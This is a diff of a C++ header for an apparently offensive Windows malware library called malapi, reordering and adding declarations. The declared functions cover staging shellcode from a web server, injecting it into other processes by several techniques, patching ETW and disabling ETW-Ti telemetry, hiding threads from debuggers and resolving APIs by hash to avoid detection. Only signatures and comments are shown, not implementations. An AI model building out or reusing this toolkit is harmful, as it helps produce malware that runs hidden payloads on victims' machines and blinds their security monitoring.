@@ -2,7 +2,6 @@
 #define MALAPI_MALAPI_HPP
 #include <windows.h>
 #include <winhttp.h>
-//#include "darkloadlib/darkloadlibrary.h"
 
 #pragma region [typedefs]
 
@@ -1313,6 +1312,24 @@ DECLARE_HANDLE(HAMSISESSION);
 //
 #define SVC_ERROR                        ((DWORD)0xC0020001L)
 
+typedef struct _PS_ATTRIBUTE
+{
+	ULONG_PTR Attribute;
+	SIZE_T Size;
+	union
+	{
+		ULONG_PTR Value;
+		PVOID ValuePtr;
+	};
+	PSIZE_T ReturnLength;
+} PS_ATTRIBUTE, * PPS_ATTRIBUTE;
+
+typedef struct _PS_ATTRIBUTE_LIST
+{
+	SIZE_T TotalLength;
+	PS_ATTRIBUTE Attributes[1];
+} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
+
 #pragma endregion
 
 #pragma region [ntapi_typedefs]
@@ -1440,6 +1457,20 @@ typedef NTSTATUS(NTAPI* typeNtCreateProcessEx)(
 	_Reserved_ ULONG Reserved // JobMemberLevel
 	);
 
+typedef NTSTATUS(NTAPI* typeNtCreateThreadEx)(
+	_Out_ PHANDLE ThreadHandle,
+	_In_ ACCESS_MASK DesiredAccess,
+	_In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,
+	_In_ HANDLE ProcessHandle,
+	_In_ PUSER_THREAD_START_ROUTINE StartRoutine,
+	_In_opt_ PVOID Argument,
+	_In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
+	_In_ SIZE_T ZeroBits,
+	_In_ SIZE_T StackSize,
+	_In_ SIZE_T MaximumStackSize,
+	_In_opt_ PPS_ATTRIBUTE_LIST AttributeList
+	);
+
 typedef NTSTATUS(NTAPI* typeNtReadVirtualMemory)(
 	_In_	  HANDLE ProcessHandle,
 	_In_opt_  PVOID BaseAddress,
@@ -1451,6 +1482,13 @@ typedef NTSTATUS(NTAPI* typeNtReadVirtualMemory)(
 typedef NTSTATUS(NTAPI* typeNtTerminateProcess)(
 	_In_opt_ HANDLE ProcessHandle,
 	_In_ NTSTATUS ExitStatus
+	);
+
+typedef NTSTATUS(NTAPI* typeNtFreeVirtualMemory)(
+	_In_ HANDLE ProcessHandle,
+	_Inout_ PVOID* BaseAddress,
+	_Inout_ PSIZE_T RegionSize,
+	_In_ ULONG FreeType
 	);
 
 typedef NTSTATUS(NTAPI* typeNtResumeProcess)(
@@ -1917,9 +1955,15 @@ typedef HRESULT(WINAPI* typeAmsiScanBuffer)(
 
 namespace malapi
 {
-	//
-	// 32-bit fnv-1a hashing algorithm.
-	//
+	////////////////////////////
+   //                        //
+  //      Cryptography      //
+ //                        //
+////////////////////////////
+
+//
+// 32-bit fnv-1a hashing algorithm.
+//
 	constexpr ULONG HashStringFowlerNollVoVariant1a(_In_ LPCSTR String)
 	{
 		ULONG Hash = 0x6A6CCC06;
@@ -1969,198 +2013,6 @@ namespace malapi
 		return hash;
 	}
 
-	//
-	// Uses NtQuerySystemInformation to enumerate processes and find the first occurance in the hashlist.
-	// Returns NULL on failure.
-	//
-	DWORD GetPidFromHashedList(_In_ DWORD* HashList, _In_ SIZE_T EntryCount);
-
-	//
-	// Close a given handle via K32!CloseHandle.
-	//
-	VOID CloseHandle(_In_ HANDLE Handle);
-
-	//
-	// Uses OpenProcess to get a handle to the process
-	// Returns NULL on failure.
-	//
-	HANDLE GetProcessHandle(DWORD process_id);
-
-	//
-	// Uses VirtualAllocEx and WriteProcessMemory to write shellcode into memory
-	// Returns FALSE on failure.
-	//
-	PVOID WriteShellcodeMemory(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size);
-
-	//
-	// Stage Shellcode to Memory via HTTPS
-	// Requires Valid SSL Certificate if using HTTPS
-	//
-	// Returns Shellcode & Shellcode Size
-	//
-	BOOL DownloadShellcode(_In_ LPCWSTR base_url, _In_ LPCWSTR filename, BOOL ssl_enabled, _Out_ PBYTE* shellcode, _Out_ SIZE_T* shellcode_size);
-
-	//
-	// Uses GetFileAttributesA to check if a file exists, returns TRUE if it does.
-	//
-	BOOL CheckFileExists(_In_ LPCSTR FullPath);
-
-	//
-	// Wrapper around K32!CreateProcessW.
-	//
-	HANDLE CreateProcessW(_In_ LPWSTR command_line, _In_ LPWSTR working_directory = NULL);
-
-	//
-	// Create Suspended Process
-	// Return ProcessHandle
-	//
-	HANDLE CreateSuspendedProcess(_In_ LPSTR file_path, _Out_ HANDLE* process_handle, _Out_ HANDLE* thread_handle);
-
-	//
-	// Create Suspended Process
-	// Return ThreadHandle
-	//
-	HANDLE EntryPointHandle(LPSTR file_path, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size);
-
-	//
-	// GetModuleHandle implementation with API hashing.
-	//
-	HMODULE GetModuleHandleC(_In_ ULONG dllHash);
-
-	//
-	// GetProcAddress implementation with API hashing.
-	//
-	FARPROC GetProcAddressC(_In_ HMODULE dllBase, _In_ ULONG funcHash);
-
-	//
-	// Patch ETW
-	// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
-	//
-	BOOL PatchEtwSsn();
-
-	//
-	// Get epoch timestamp (ms) from SHARED_USER_DATA
-	//
-	SIZE_T GetTimestamp(void);
-
-	//
-	// Sleep implementation using `get_timestamp`,
-	// will crash the process if time skipping is detected.
-	//
-	void SleepMs(_In_ SIZE_T Ms);
-
-	//
-	// Returns handle to current process' heap.
-	//
-	HANDLE GetProcessHeap(void);
-
-	//
-	// Returns TEB pointer for current process.
-	//
-	PTEB GetTEB(void);
-
-	//
-	// Returns PEB pointer for current process.
-	//
-	PPEB GetPEB(void);
-
-	//
-	// Abuse a bug to disable ETW-Ti for a target process.
-	// More info: https://www.legacyy.xyz/defenseevasion/windows/2024/04/24/disabling-etw-ti-without-ppl.html
-	//
-	BOOL DisableETWTi(_In_ HANDLE TargetProcess = (HANDLE)(ULONG_PTR)~1);
-
-	//
-	// Patch ETW
-	// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
-	//
-	BOOL PatchEtwSsn(void);
-
-	//
-	// Patch ETW via EtwEventWrite/EtwEventWriteFull
-	// https://gist.github.com/wizardy0ga/7cadcc7484092ff25a218615005405b7
-	//
-	BOOL PatchEtwEventWrite(void);
-
-	//
-	// Returns PEB pointer for current process. (Retrieved from TEB)
-	//
-	PPEB GetPEBFromTEB(void);
-
-	//
-	// Search a region of memory for an egg. Returns NULL on failure.
-	//
-	PVOID EggHunt(_In_ PVOID RegionStart, _In_ SIZE_T RegionLength, _In_ PVOID Egg, _In_ SIZE_T EggLength);
-
-	//
-	// Gets the process cookie from the PEB
-	//
-	ULONG GetProcessCookie(void);
-
-	//
-	// Allocate a block of memory in the current process' heap.
-	// Returns a pointer to the allocated chunk, or NULL on failure.
-	//
-	PVOID HeapAlloc(_In_ SIZE_T Size);
-
-	//
-	// ReAllocate a block of memory in the current process' heap.
-	// Returns a pointer to the allocated block, or NULL on failure.
-	//
-	PVOID HeapReAlloc(_In_ PVOID Buffer, _In_ SIZE_T Size);
-
-	//
-	// Free a block of memory in the current process' heap.
-	// Returns TRUE on success, FALSE on failure.
-	//
-	BOOL HeapFree(_In_ PVOID BlockAddress);
-
-	//
-	// Hide a given thread from the debugger by setting THREAD_INFO_CLASS::ThreadHideFromDebugger
-	// Defaults to current thread unless specified otherwise.
-	//
-	VOID HideFromDebugger(_In_ HANDLE ThreadHandle = (HANDLE)-2);
-
-	////////////////////////////////////////////////////
-	//
-	// Injection Techniques
-	//
-
-	//
-	// Inject shellcode into a target process via NtCeationSection -> NtMapViewOfSection -> RtlCreateUserThread.
-	//
-	BOOL InjectionNtMapViewOfSection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
-
-	//
-	// Process Injection
-	//
-	BOOL InjectionCreateRemoteThread(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
-
-	//
-	// Remote Thread Hijacking
-	//
-	BOOL InjectionRemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
-
-	//
-	// InjectionAddressOfEntryPoint Injection
-	//
-	BOOL InjectionAddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
-
-	//
-	// Process InjectionDoppleganger
-	//
-	BOOL InjectionDoppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
-
-	//
-	// QueueUserApc Injection
-	//
-	BOOL InjectionQueueUserAPC(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
-
-	////////////////////////////////////////////////////
-	//
-	// Decryption
-	//
-
 	VOID NONE(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
 
 	//
@@ -2172,25 +2024,27 @@ namespace malapi
 
 	VOID RC4(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
 
-	//
-	// Returns TRUE if current process token is elevated, otherwise FALSE (including on error).
-	//
-	BOOL IsProcessRunningAsAdmin(void);
+	/////////////////////////////
+   //                         //
+  //      Functionality      //
+ //                         //
+/////////////////////////////
+
+//
+// Uses NtQuerySystemInformation to enumerate processes and find the first occurance in the hashlist.
+// Returns NULL on failure.
+//
+	DWORD GetPidFromHashedList(_In_ DWORD* HashList, _In_ SIZE_T EntryCount);
 
 	//
-	// memcmp implementation.
+	// GetModuleHandle implementation with API hashing.
 	//
-	INT memcmp(const void* s1, const void* s2, size_t n);
+	HMODULE GetModuleHandleC(_In_ ULONG dllHash);
 
 	//
-	// memcpy implementation.
+	// GetProcAddress implementation with API hashing.
 	//
-	extern "C" void* __cdecl memcpy(void*, const void*, size_t);
-
-	//
-	// memset implementation.
-	//
-	extern "C" void* __cdecl memset(void*, int, size_t);
+	FARPROC GetProcAddressC(_In_ HMODULE dllBase, _In_ ULONG funcHash);
 
 	//
 	// String compare implementation (ascii).
@@ -2220,9 +2074,239 @@ namespace malapi
 	PWCHAR StringCopy(_Inout_ PWCHAR String1, _In_ LPCWSTR String2);
 
 	//
+	// Uses GetFileAttributesA to check if a file exists, returns TRUE if it does.
+	//
+	BOOL CheckFileExists(_In_ LPCSTR FullPath);
+
+	//
+	// Returns TRUE if current process token is elevated, otherwise FALSE (including on error).
+	//
+	BOOL IsProcessRunningAsAdmin(void);
+
+	///////////////////////
+   //                   //
+  //      Staging      //
+ //                   //
+///////////////////////
+
+//
+// Stage Shellcode to Memory via HTTP
+// Requires Valid SSL Certificate if using HTTPS
+//
+// Returns Shellcode & Shellcode Size
+//
+	BOOL StageShellcodeHttp(_In_ LPCWSTR base_url, _In_ LPCWSTR filename, BOOL ssl_enabled, _Out_ PBYTE* shellcode, _Out_ SIZE_T* shellcode_size);
+
+	///////////////////////////////////
+   //                               //
+  //      Process Interaction      //
+ //                               //
+///////////////////////////////////
+
+//
+// Uses OpenProcess to get a handle to the process
+// Returns NULL on failure.
+//
+	HANDLE GetProcessHandle(DWORD process_id);
+
+	//
+	// Close a given handle via K32!CloseHandle.
+	//
+	VOID CloseHandle(_In_ HANDLE Handle);
+
+	//
+	// Wrapper around K32!CreateProcessW.
+	//
+	HANDLE CreateProcessW(_In_ LPWSTR command_line, _In_ LPWSTR working_directory = NULL);
+
+	//
+	// Create Suspended Process
+	// Return ProcessHandle
+	//
+	HANDLE CreateSuspendedProcess(_In_ LPSTR file_path, _Out_ HANDLE* process_handle, _Out_ HANDLE* thread_handle);
+
+	//
+	// Create Suspended Process
+	// Return ThreadHandle
+	//
+	HANDLE EntryPointHandle(LPSTR file_path, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size);
+
+	/////////////////////////////////
+   //                             //
+  //      Process Injection      //
+ //                             //
+/////////////////////////////////
+
+//
+// Inject shellcode into a target process via NtCeationSection -> NtMapViewOfSection -> RtlCreateUserThread.
+//
+	BOOL InjectionNtMapViewOfSection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// Process Injection
+	//
+	BOOL InjectionCreateRemoteThread(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// Remote Thread Hijacking
+	//
+	BOOL InjectionRemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// InjectionAddressOfEntryPoint Injection
+	//
+	BOOL InjectionAddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// Process InjectionDoppleganger
+	//
+	BOOL InjectionDoppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// QueueUserApc Injection
+	//
+	BOOL InjectionQueueUserAPC(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	///////////////////////
+   //                   //
+  //      Evasion      //
+ //                   //
+///////////////////////
+
+//
+// Patch ETW
+// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
+//
+	BOOL PatchEtwSsn();
+
+	//
+	// Abuse a bug to disable ETW-Ti for a target process.
+	// More info: https://www.legacyy.xyz/defenseevasion/windows/2024/04/24/disabling-etw-ti-without-ppl.html
+	//
+	BOOL DisableETWTi(_In_ HANDLE TargetProcess = (HANDLE)(ULONG_PTR)~1);
+
+	//
+	// Patch ETW
+	// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
+	//
+	BOOL PatchEtwSsn(void);
+
+	//
+	// Patch ETW via EtwEventWrite/EtwEventWriteFull
+	// https://gist.github.com/wizardy0ga/7cadcc7484092ff25a218615005405b7
+	//
+	BOOL PatchEtwEventWrite(void);
+
+	//
+	// Get epoch timestamp (ms) from SHARED_USER_DATA
+	//
+	SIZE_T GetTimestamp(void);
+
+	//
+	// Sleep implementation using `get_timestamp`,
+	// will crash the process if time skipping is detected.
+	//
+	void SleepMs(_In_ SIZE_T Ms);
+
+	/////////////////////////////
+   //                         //
+  //      Anti Debugging     //
+ //                         //
+/////////////////////////////
+
+	//
+	// Hide a given thread from the debugger by setting THREAD_INFO_CLASS::ThreadHideFromDebugger
+	// Defaults to current thread unless specified otherwise.
+	//
+	VOID HideFromDebugger(_In_ HANDLE ThreadHandle = (HANDLE)-2);
+
+	////////////////////////////////
+   //                            //
+  //      Memory Management     //
+ //                            //
+////////////////////////////////
+
+	//
+	// Allocate a block of memory in the current process' heap.
+	// Returns a pointer to the allocated chunk, or NULL on failure.
+	//
+	PVOID HeapAlloc(_In_ SIZE_T Size);
+
+	//
+	// ReAllocate a block of memory in the current process' heap.
+	// Returns a pointer to the allocated block, or NULL on failure.
+	//
+	PVOID HeapReAlloc(_In_ PVOID Buffer, _In_ SIZE_T Size);
+
+	//
+	// Free a block of memory in the current process' heap.
+	// Returns TRUE on success, FALSE on failure.
+	//
+	BOOL HeapFree(_In_ PVOID BlockAddress);
+
+	//
+	// Uses VirtualAllocEx and WriteProcessMemory to write shellcode into memory
+	// Returns FALSE on failure.
+	//
+	PVOID WriteShellcodeMemory(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size);
+
+	//
 	// Zero a region of memory.
 	//
 	VOID ZeroMemoryEx(_Inout_ PVOID Destination, _In_ SIZE_T Size);
+
+	VOID FreeVirtualMemory(_In_ HANDLE handle, _Inout_ PVOID base_address);
+
+	//
+	// memcmp implementation.
+	//
+	INT memcmp(const void* s1, const void* s2, size_t n);
+
+	//
+	// memcpy implementation.
+	//
+	extern "C" void* __cdecl memcpy(void*, const void*, size_t);
+
+	//
+	// memset implementation.
+	//
+	extern "C" void* __cdecl memset(void*, int, size_t);
+
+	//
+	// Returns handle to current process' heap.
+	//
+	HANDLE GetProcessHeap(void);
+
+	//
+	// Returns TEB pointer for current process.
+	//
+	PTEB GetTEB(void);
+
+	//
+	// Returns PEB pointer for current process.
+	//
+	PPEB GetPEB(void);
+
+	//
+	// Returns PEB pointer for current process. (Retrieved from TEB)
+	//
+	PPEB GetPEBFromTEB(void);
+
+	//
+	// Search a region of memory for an egg. Returns NULL on failure.
+	//
+	PVOID EggHunt(_In_ PVOID RegionStart, _In_ SIZE_T RegionLength, _In_ PVOID Egg, _In_ SIZE_T EggLength);
+
+	//
+	// Gets the process cookie from the PEB
+	//
+	ULONG GetProcessCookie(void);
+
+	///////////////////////
+   //                   //
+  //      Service      //
+ //                   //
+///////////////////////
 
 	//
 	// Sets the current service status and reports it to the SCM.
